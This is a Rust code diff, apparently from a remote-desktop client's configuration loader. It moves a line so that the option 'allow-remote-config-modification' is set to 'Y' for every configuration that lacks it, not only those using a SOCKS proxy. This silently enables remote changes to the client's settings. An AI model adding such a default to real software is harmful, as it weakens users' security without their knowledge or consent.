@@ -532,21 +532,29 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
-        if let Some(mut socks) = config.socks {
+
+        // ==============================================================
+        // 正确位置：放在这里，独立于任何其他配置的检查
         if !config.options.contains_key("allow-remote-config-modification") {
-                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
-                store = true;
-            }    
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+        // ==============================================================
+
+        // 原本的 SOCKS 处理逻辑保持不变
+        if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
             socks.password = password;
             config.socks = Some(socks);
             store |= store2;
         }
+        
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        
         if store {
             config.store();
         }
